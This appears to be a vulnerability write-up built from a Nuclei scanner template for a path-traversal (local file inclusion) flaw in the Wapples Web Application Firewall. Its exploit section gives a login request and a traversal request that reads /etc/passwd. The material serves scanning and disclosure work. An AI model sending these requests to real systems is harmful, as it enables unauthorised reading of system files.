# Nuclei Template: Wapples Web Application Firewall - Local File Inclusion
**Template ID:** wapples-firewall-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wapples-firewall-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Wapples Web Application Firewall is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
POST /webapi/auth HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id={{username}}&password={{password}}

GET /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

## References
- https://medium.com/@_sadshade/wapples-web-application-firewall-multiple-vulnerabilities-35bdee52c8fb
